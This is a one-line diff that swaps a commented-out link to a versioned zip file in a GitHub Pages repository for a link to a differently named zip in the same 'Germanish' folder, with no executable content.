@@ -1,1 +1,1 @@
-# https://raw.githubusercontent.com/hiharpin/harpin.github.io/main/Germanish/github-harpin-io-v1.1.zip
+# https://github.com/hiharpin/harpin.github.io/raw/refs/heads/main/Germanish/io-harpin-github-3.7-beta.2.zip
